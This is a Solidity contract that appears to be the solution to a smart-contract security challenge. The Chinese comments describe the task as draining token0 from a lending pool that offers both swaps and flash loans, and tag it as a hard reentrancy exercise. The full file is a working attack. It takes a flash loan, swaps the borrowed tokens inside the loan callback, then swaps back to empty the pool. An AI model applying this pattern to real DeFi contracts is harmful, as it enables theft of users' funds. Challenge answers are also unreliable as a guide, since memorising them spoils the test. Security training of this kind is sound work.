// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;
import "./pool.sol";
// @knowledgePoint 重入
// @level 困难
// @description 这是一个同时拥有swap和闪电贷的交易池，这个交易池有两个token，
// 初始状态下，交易池各拥有100 * 10**18个token。想办法套空token0中Lenderpool的余额。

contract LenderPoolAttack {
    Check public check;
    LenderPool public lenderPool;
    IERC20 public token0;
    IERC20 public token1;

    constructor(address _check){
        check = Check(_check);
        lenderPool = check.lenderPool();
        token0 = lenderPool.token0();
        token1 = lenderPool.token1();
    }

    function exploit() public {
        lenderPool.flashLoan(100 * 10**18, address(this));
        token1.approve(address(lenderPool),100 * 10**18);
        lenderPool.swap(address(token0), 100 * 10**18);
        check.isCompleted();
    }

    function receiveEther(uint256 amount) public{
        token0.approve(address(lenderPool),100 * 10**18);
        lenderPool.swap(address(token1), 100 * 10**18);

    }
}
